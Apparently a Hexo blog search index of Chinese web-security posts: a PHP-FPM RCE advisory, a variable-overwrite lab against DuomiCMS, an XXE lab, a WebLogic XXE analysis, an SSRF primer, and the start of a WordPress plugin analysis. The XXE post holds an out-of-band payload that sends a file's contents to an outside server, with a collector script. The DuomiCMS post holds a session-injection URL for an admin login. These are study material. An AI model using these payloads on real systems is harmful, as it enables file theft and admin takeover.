<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP远程代码执行漏洞预警（CVE-2019-11043）</title>
      <link href="/2019/11/02/PHP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%EF%BC%88CVE-2019-11043%EF%BC%89/"/>
      <url>/2019/11/02/PHP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%EF%BC%88CVE-2019-11043%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><p><strong><br>在2019年**</strong>9<strong><strong>月</strong></strong>26日<strong><strong>，</strong></strong>PHP官方发布了一则漏洞公告，此次漏洞公告中官方披露了一个远程代码执行漏洞，该漏洞是因PHP-FPM中的fpm_main.c文件的env_path_info下溢而导致的。该漏洞存在于PHP-FPM + Nginx组合使用并采用一定配置的情况下。该漏洞PoC已在2019年10月22日公布，PHP与Nginx组合使用的情况较为广泛，攻击者可利用该漏洞远程执行任意代码，所以危害性较大。**</p><h2 id="PHP-FPM组件-介绍"><a href="#PHP-FPM组件-介绍" class="headerlink" title="\PHP-FPM组件****介绍****"></a><strong><em>\</em>PHP-FPM组件*<em>**</em></strong>*介绍****</h2><p>PHP-FPM（FastCGI流程管理器）是另一种PHP FastCGI实现，具有一些其他功能，可用于各种规模的站点，尤其是繁忙的站点。</p><p>对于PHP 5.3.3之前的php来说，PHP-FPM是一个补丁包，旨在将FastCGI进程管理整合进PHP包中。如果你使用的是PHP 5.3.3之前的PHP的话，就必须将它patch到你的PHP源代码中，在编译安装PHP后才可以使用。而PHP 5.3.3已经集成php-fpm了，不再是第三方的包了。PHP-FPM提供了更好的PHP<a href="https://baike.baidu.com/item/进程管理" target="_blank" rel="noopener">进程管理</a>方式，可以有效控制内存和进程、可以平滑<a href="https://baike.baidu.com/item/重载" target="_blank" rel="noopener">重载</a>PHP配置。</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="\漏洞描述**"></a><strong><em>\</em>漏洞描述**</strong></h2><p>该漏洞是PHP-FPM中的fpm_main.c文件的env_path_info下溢导致，在sapi/fpm/fpm/fpm_main.c文件中的第1140行包含pointer arithmetics，这些pointer arithmetics假定env_path_info的前缀等于php脚本的路径。但是，代码不会检查这些假设是否被满足，缺少检查会导致”path_info”变量中的指针无效。</p><p>这样的条件可以在标准的Nginx配置中实现。如果有这样的Nginx配置：</p><p>攻击者可以使用换行符（编码格式为％0a）来破坏<code>fastcgi_split_path_info</code>指令中的regexp。regexp损坏将导致空PATH_INFO，从而触发该错误。</p><p>这个错误会导致代码执行漏洞。在后面的代码中，path_info[0]的值设置为0，然后再调用FCGI_PUTENV。攻击者可以使用精心选择的URL路径长度和查询字符串，使path_info精确地指向_fcgi_data_seg结构的第一个字节。然后将0放入其中则‘char* pos’字段向后移动，然后FCGI_PUTENV使用脚本路径覆盖一些数据(包括其他快速cgi变量)。使用这种技术，攻击者可以创建一个伪PHP_VALUE fcgi变量，然后使用一系列精心选择的配置值来执行代码。</p><h2 id="影响产品："><a href="#影响产品：" class="headerlink" title="影响产品："></a><strong>影响产品：</strong></h2><p>在2019-09-26更新之前下载的PHP-FPM，且必须为Nginx + php-fpm 的服务器使用如下配置，会受到影响。</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="\修复建议**"></a><strong><em>\</em>修复建议**</strong></h2><p>\1. 如果业务不需要以下配置，建议用户删除：</p><p>\2. 使用github中的最新的PHP版本，下载地址：</p><p><a href="https://github.com/php/php-src" target="_blank" rel="noopener">https://github.com/php/php-src</a></p><p><strong><em>\</em>参考链接**</strong></p><p><a href="https://bugs.php.net/bug.php?id=78599" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78599</a></p><hr><p> 原文链接：<a href="https://www.secpulse.com/archives/116285.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/116285.html</a> </p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>变量覆盖漏洞</title>
      <link href="/2019/11/01/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-1/"/>
      <url>/2019/11/01/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-1/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="什么是变量覆盖"><a href="#什么是变量覆盖" class="headerlink" title="什么是变量覆盖"></a><strong>什么是变量覆盖</strong></h1><p><strong>变量覆盖指的是可以用自定义的参数值替换程序原有的变量值</strong></p><h3 id="怎么去寻找变量覆盖？"><a href="#怎么去寻找变量覆盖？" class="headerlink" title="怎么去寻找变量覆盖？"></a><strong>怎么去寻找变量覆盖？</strong></h3><p><strong>经常导致变量覆盖漏洞场景又：$$使用不当，extracat()函数使用不当，parse_str()函数使用不当import_request_variables()使用不当，开启了全局变量注册等。</strong></p><p><strong>变量覆盖漏洞有的时候可以直接让我们获取webshell，那单服务器的权限</strong></p><h1 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a><strong>函数解析</strong></h1><p><strong>经常引起变量覆盖漏洞的函数有：extracat()，parse_str()，import_request_variables()</strong></p><p><strong>extract()函数（作用：从数组中导入变量到当前的符号表）</strong></p><h4 id="给一个实例："><a href="#给一个实例：" class="headerlink" title="给一个实例："></a><strong>给一个实例：</strong></h4><blockquote><p><strong>&lt;?php</strong></p><p><strong>$a = “Original”;</strong></p><p><strong>$my_array = array(“a” =&gt; “Cat”,”b” =&gt; “Dog”,”c” =&gt;”Horse”);</strong></p><p><strong>extaract($my_array);</strong></p><p><strong>echo “\$a = $a;  \$b=$b; \$c=$c”;</strong></p><p><strong>?&gt;</strong></p></blockquote><h4 id="运行结果：-a-Cat-b-Dog-c-Horse"><a href="#运行结果：-a-Cat-b-Dog-c-Horse" class="headerlink" title="运行结果：$a=Cat; $b=Dog; $c=Horse"></a><strong>运行结果：$a=Cat; $b=Dog; $c=Horse</strong></h4><p><strong>parse_str() 将查询字符解析到变量中：</strong></p><blockquote><p><strong>&lt;?php</strong><br><strong>parse_str(“n=z&amp;a=60”);</strong></p><p><strong>echo $n;</strong></p><p><strong>echo $a;</strong><br><strong>?&gt;</strong></p></blockquote><p><strong>输出了z和60</strong></p><blockquote><p><strong>那么parse_str(“name=Bill&amp;age=60”) 相当于完成了$n = ‘n’和$a=’60’</strong></p></blockquote><p><strong>$$ 特殊符号搭配问题：</strong></p><blockquote><p><strong><code>&lt;?php</code></strong></p><p><strong><code>$a=1;</code></strong></p><p><strong><code>foreach(array(&#39;__COOKIE&#39;,&#39;__POST&#39;,&#39;__GEI&#39;)as$_request){</code></strong></p><p><strong><code>foreach($$_request as $_key=&gt;$value)</code></strong></p><p><strong><code>{$$_key=addslashes($_value);}}</code></strong></p><p><strong><code>echo $a;</code></strong></p><p><strong><code>}</code></strong></p></blockquote><p><strong>这个代码会接受我们的GEI提交、POST提交、COOKIE参数、将这个接受来的参数依次放入<code>$_request $_key=&gt;$value</code> 这是个数组解析、实际上就是键值分离</strong></p><p>​    <strong><code>$a=1</code>是一个定值，但是因为<code>$$_key</code>的缘故，当我传参a=2;那么<code>$_key=addslashes($_value);</code>就变成<code>$a=2</code></strong></p><p><strong>(PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0)</strong></p><p><strong>import_request_variables — 将 GET／POST／Cookie 变量导入到全局作用域中</strong></p><h1 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a><strong>靶场实战</strong></h1><p><strong>这种变量覆盖的漏洞大多是白盒测试，这里选择在DuomiCMS2.0中进行。</strong></p><p><strong>使用seay代码审计工具去快速找到危险函数，这里是变量覆盖，可以加个规则匹配$$的规则：<code>([^\$&quot;]|$)\$\{?\$</code></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖01.png" alt="躲起来了"></strong></p><p><strong>扫描后发现foreach函数，可能就存在$$变量覆盖的问题</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖02.png" alt="躲起来了"></strong></p><p><strong>有联系的可利用，包含文件</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖03.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖04.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖05.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖06.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖07.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖08.png" alt="躲起来了"></strong></p><p><strong>一系列追踪发现可以自己生成session到check.admin.php调用，并与id绑定，获取管理员账号。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interface/comment.php?_SESSION[duomi_group_id]=1&amp;_SESSION[duomi_admin_id]=1&amp;_SESSION[duomi_admin_name]=admin</span><br></pre></td></tr></table></figure><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖09.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖10.png" alt="躲起来了"></strong></p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE - 实体注入</title>
      <link href="/2019/10/30/XXE-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%20-1/"/>
      <url>/2019/10/30/XXE-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%20-1/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a><strong>XML基础知识</strong></h1><p><strong>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/xxe01.png" alt="躲起来了"></strong></p><p><strong>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</strong></p><p><strong>内部声明DTD</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p><strong>引用外部DTD</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</strong></p><p><strong>内部声明实体</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>引用外部实体</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><hr><p><strong>在知道了解了xml后，就可以发现，当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</strong></p><hr><h2 id="接下来就利用靶场进行XXE-实体注入（利用掌控者的封神台靶场）"><a href="#接下来就利用靶场进行XXE-实体注入（利用掌控者的封神台靶场）" class="headerlink" title="接下来就利用靶场进行XXE - 实体注入（利用掌控者的封神台靶场）"></a><strong>接下来就利用靶场进行XXE - 实体注入（利用掌控者的<a href="https://hack.zkaq.org/?a=battle" target="_blank" rel="noopener">封神台</a>靶场）</strong></h2><h3 id="查看代码："><a href="#查看代码：" class="headerlink" title="查看代码："></a><strong>查看代码：</strong></h3><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/xxe02.png" alt="躲起来了"></strong></p><p><strong>simplexml_load_string() 函数是把 XML 字符串载入对象中。</strong></p><p><strong>如果失败，则返回 false。</strong></p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a><strong>语法</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simplexml_load_file(string,class,options,ns,is_prefix)</span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>参数</strong></th><th style="text-align:right"><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>string</strong></td><td style="text-align:right"><strong>必需。规定要使用的 XML 字符串。</strong></td></tr><tr><td><strong>class</strong></td><td style="text-align:right"><strong>可选。规定新对象的 class。</strong></td></tr><tr><td><strong>options</strong></td><td style="text-align:right"><strong>可选。规定附加的 Libxml 参数。</strong></td></tr><tr><td><strong>ns</strong></td><td style="text-align:right"><strong>可选。</strong></td></tr><tr><td><strong>is_prefix</strong></td><td style="text-align:right"><strong>可选。</strong></td></tr></tbody></table><p><strong>该函数回去读取post请求数据，并将post请求数据通过 simplexml_load_string() 函数转换为XML有关的对象，</strong></p><p><strong>其中，也没有禁止xml数据中使用外部实体（例如使用libxml_disable_entity_loader(true)），也没有过滤用户提交的XML数据。因此可以进行XXE注入。</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/xxe03.png" alt="躲起来了"></strong></p><p><strong>改POST请求</strong></p><p><strong>1.xml内容如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://**********/xxe/2.php?id=%file;&apos;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p><strong>2.php如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&quot;id&quot;],FILE_APPEND);?&gt;</span><br></pre></td></tr></table></figure><p><strong>最后到自己公网上的服务器上看成功与否</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/xxe04.png" alt="躲起来了"></strong></p><p><strong>得到一串字符，进行base64解码</strong></p><p><strong>成功得到poc上的对方服务器的文件内容</strong></p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic EJBTaglibDescriptor XXE漏洞(CVE-2019-2888)分析</title>
      <link href="/2019/10/29/XXE%E6%BC%8F%E6%B4%9E(CVE-2019-2888)%E5%88%86%E6%9E%90/"/>
      <url>/2019/10/29/XXE%E6%BC%8F%E6%B4%9E(CVE-2019-2888)%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><p><strong>作者：Longofo@知道创宇404实验室</strong><br><strong>时间：2019年10月16日</strong></p><p>这个漏洞和之前@Matthias Kaiser提交的几个XXE漏洞是类似的，而<code>EJBTaglibDescriptor</code>应该是漏掉的一个，可以参考之前几个XXE的<a href="https://paper.seebug.org/906/" target="_blank" rel="noopener">分析</a>。我和@Badcode师傅反编译了WebLogic所有的Jar包，根据之前几个XXE漏洞的特征进行了搜索匹配到了这个EJBTaglibDescriptor类，这个类在反序列化时也会进行XML解析。</p><p>Oracle发布了10月份的补丁，详情见链接(<a href="https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html" target="_blank" rel="noopener">https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html</a>)</p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>Windows 10</li><li>WebLogic 10.3.6.0.190716(安装了19年7月补丁)</li><li>Jdk160_29（WebLogic 自带的JDK）</li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weblogic.jar!\weblogic\servlet\ejb2jsp\dd\EJBTaglibDescriptor.class`这个类继承自`java\io\Externalizable</span><br></pre></td></tr></table></figure><p><img src="https://images.seebug.org/content/images/2019/10/30/1572427265000-6.png-w331s" alt="img"></p><p>因此在序列化与反序列化时会自动调用子类重写的<code>writeExternal</code>与<code>readExternal</code></p><p>看下<code>writeExternal</code>的逻辑与<code>readExternal</code>的逻辑，</p><p><img src="https://images.seebug.org/content/images/2019/10/30/1572427266000-7.png-w331s" alt="img"></p><p>在<code>readExternal</code>中，使用<code>ObjectIutput.readUTF</code>读取反序列化数据中的String数据，然后调用了load方法，</p><p><img src="https://images.seebug.org/content/images/2019/10/30/1572427266000-8.png-w331s" alt="img"></p><p>在load方法中，使用<code>DocumentBuilder.parse</code>解析了反序列化中传递的XML数据，因此这里是可能存在XXE漏洞的</p><p>在<code>writeExternal</code>中，调用了本身的<code>toString</code>方法，在其中又调用了自身的<code>toXML</code>方法</p><p><img src="https://images.seebug.org/content/images/2019/10/30/1572427266000-9.png-w331s" alt="img"></p><p><img src="https://images.seebug.org/content/images/2019/10/30/1572427266000-10.png-w331s" alt="img"></p><p><code>toXML</code>的作用应该是将<code>this.beans</code>转换为对应的xml数据。看起来要构造payload稍微有点麻烦，但是序列化操作是攻击者可控制的，所以我们可以直接修改<code>writeExternal</code>的逻辑来生成恶意的序列化数据：</p><p><img src="https://images.seebug.org/content/images/2019/10/30/1572427266000-11.png-w331s" alt="img"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol><li><p>重写 <code>EJBTaglibDescriptor</code>中的<code>writeExternal</code>函数，生成payload</p><p><img src="https://images.seebug.org/content/images/2019/10/5546d729-24f7-40c2-bbfb-0bff6e03386a.png-w331s" alt=" "></p></li><li><p>发送payload到服务器</p><p><img src="https://images.seebug.org/content/images/2019/10/6bb31bcc-d21e-430e-9452-2f75d5373606.png-w331s" alt=" "></p><p>在我们的HTTP服务器和FTP服务器接收到了my.dtd的请求与win.ini的数据</p><p><img src="https://images.seebug.org/content/images/2019/10/a691da5f-964f-489a-ae51-979e0f817148.png-w331s" alt=" "></p></li><li><p>在打了7月份最新补丁的服务器上能看到报错信息</p><p><img src="https://images.seebug.org/content/images/2019/10/a2993437-edfd-4f7e-a0b1-bba0ed9d0de5.png-w331s" alt=" "></p></li></ol><hr><p> 本文地址：<a href="https://paper.seebug.org/1067/" target="_blank" rel="noopener">https://paper.seebug.org/1067/</a> </p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF - 服务器端请求伪造</title>
      <link href="/2019/10/28/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-1/"/>
      <url>/2019/10/28/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-1/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="SSRF漏洞是如何产生的？"><a href="#SSRF漏洞是如何产生的？" class="headerlink" title="SSRF漏洞是如何产生的？"></a>SSRF漏洞是如何产生的？</h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p>简述：SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现在这个请求是合法的，然后<strong>服务器以他的身份来访问其他服务器的资源</strong>。</p><h4 id="网站访问大致步骤："><a href="#网站访问大致步骤：" class="headerlink" title="网站访问大致步骤："></a>网站访问大致步骤：</h4><p>用户在地址栏输入网址 –》 向目标网站发送请求 –》 目标网站接受请求并在服务器端验证请求是否合法，然后返回用户所需要的页面 –》用户接收页面并在浏览器中显示</p><h2 id="SSRF漏洞的验证方法："><a href="#SSRF漏洞的验证方法：" class="headerlink" title="SSRF漏洞的验证方法："></a>SSRF漏洞的验证方法：</h2><p>1）因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞</p><p>2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p><p><code>部分内容摘自其他网站</code></p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>探究if条件语句引发的两个Web漏洞</title>
      <link href="/2019/10/26/%E6%8E%A2%E7%A9%B6if%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5%E5%BC%95%E5%8F%91%E7%9A%84%E4%B8%A4%E4%B8%AAWeb%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/10/26/%E6%8E%A2%E7%A9%B6if%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5%E5%BC%95%E5%8F%91%E7%9A%84%E4%B8%A4%E4%B8%AAWeb%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>在编写代码时，常常需要为不同的判断执行不同的动作，if 条件判断语句可以用来实现此功能。然而这么一个再平常不过的条件判断语句，如果使用不当，也可能成为漏洞的产生点。在 WordPress 中有一个使用非常广泛的插件，名为「adaptive images」。该插件可提供自适应图像，以透明的方式调整和优化传送到移动设备的图像，从而显著地减少页面的加载时间。正是因为在使用 if 语句的过程中，没有严格地控制逻辑和流程，所以导致了文件包含漏洞（File Inclusion）和任意文件删除漏洞（Arbitrary File Deletion）的产生。这两个漏洞一旦被黑客利用，将会产生严重的后果，比如系统信息泄露、用户信息泄露以及关键文件被删除等等。在版本号&lt;=0.6.66 的 adaptive images 插件中存在上述漏洞。</strong></p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><blockquote><p>\1. 目标主机：Debian9.6 x6</p><p>\2. 软件版本：wordpress-5.2.2 </p><p>\3. 插件版本：adaptive-images.0.6.65</p><p>4.XAMPP for Linux 5.6.305.python-2.7.15</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>\1. 第一段源代码具体如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">    function adaptive_images_script_get_settings () &#123;</span><br><span class="line">        if ( ! isset( $_REQUEST[&apos;adaptive-images-settings&apos;] ) ) &#123;</span><br><span class="line">            $current_directory  = dirname( $_SERVER[&apos;SCRIPT_FILENAME&apos;] );</span><br><span class="line">            $resolutions    = array( 1024, 600, 480 );</span><br><span class="line">            $landscape      = TRUE;</span><br><span class="line">            $hidpi          = TRUE;</span><br><span class="line">            $wp_content_dir = realpath( $current_directory . &apos;/../../&apos; );</span><br><span class="line">            $wp_content_url = &apos;http://&apos; . $_SERVER[&apos;HTTP_HOST&apos;] . &apos;/wp-content&apos;;</span><br><span class="line">            $cache_dir      = &quot;cache/adaptive-images&quot;;</span><br><span class="line">            $jpg_quality    = 65;</span><br><span class="line">            $png8           = FALSE;</span><br><span class="line">            $sharpen        = TRUE;</span><br><span class="line">            $watch_cache    = TRUE;</span><br><span class="line">            $browser_cache  = 60*60*24*7;</span><br><span class="line">            $user_settings_file = realpath( $current_directory . &apos;/user-settings.php&apos; );</span><br><span class="line">            if ( file_exists( $user_settings_file ) ) &#123;</span><br><span class="line">                include( &apos;user-settings.php&apos; );</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            $request_uri    = parse_url( urldecode( $_SERVER[&apos;REQUEST_URI&apos;] ), PHP_URL_PATH );</span><br><span class="line">            $wp_content_url = preg_replace( &apos;/^https?/&apos;,  &apos;&apos;, $wp_content_url );</span><br><span class="line">            $url            = preg_replace( &apos;/^https?/&apos;,  &apos;&apos;, adaptive_images_script_get_url() . $request_uri );</span><br><span class="line">            $source_file    = str_ireplace( $wp_content_url, $wp_content_dir, $url );</span><br><span class="line">            </span><br><span class="line">            if ( isset( $_GET[&apos;resolution&apos;] ) ) &#123;</span><br><span class="line">                </span><br><span class="line">                $cookie_resolution = $_GET[&apos;resolution&apos;];</span><br><span class="line">            &#125; else if ( isset( $_COOKIE[&apos;resolution&apos;] ) ) &#123; </span><br><span class="line">                $cookie_resolution = $_COOKIE[&apos;resolution&apos;];</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $cookie_resolution = null;</span><br><span class="line">            &#125;</span><br><span class="line">            $client_width  = $resolutions[0];</span><br><span class="line">            $pixel_density = 1;</span><br><span class="line">            if ( ! isset( $cookie_resolution ) || isset( $cookie_resolution ) &amp;&amp; ! preg_match( &quot;/^[\d]+[,]+[\d]+[\.]?[\d]*$/&quot;, $cookie_resolution ) ) &#123; </span><br><span class="line">                setcookie( &apos;resolution&apos;, &apos;&apos;, time() - 100 );</span><br><span class="line">            &#125; else &#123; </span><br><span class="line">                $cookie_array = explode( &apos;,&apos;, $cookie_resolution );</span><br><span class="line">                if ( count( $cookie_array ) &gt; 0 ) &#123; </span><br><span class="line">                    $client_width  = intval( $cookie_array[0] );</span><br><span class="line">                &#125;</span><br><span class="line">                if ( $hidpi ) &#123; </span><br><span class="line">                    if ( count( $cookie_array ) &gt; 1 ) &#123; </span><br><span class="line">                        $pixel_density = $cookie_array[1];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            $client_width_scaled = $client_width * $pixel_density;</span><br><span class="line">            $resolution = $resolutions[0];</span><br><span class="line">            foreach ( $resolutions as $breakpoint ) &#123;</span><br><span class="line">                if ( $client_width_scaled &lt;= $breakpoint ) &#123;</span><br><span class="line">                    $resolution = $breakpoint;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            $debug = isset( $_GET[&apos;debug&apos;] ) ? $_GET[&apos;debug&apos;] : FALSE;</span><br><span class="line">            $_REQUEST[&apos;adaptive-images-settings&apos;] = array( </span><br><span class="line">                &apos;debug&apos;          =&gt; 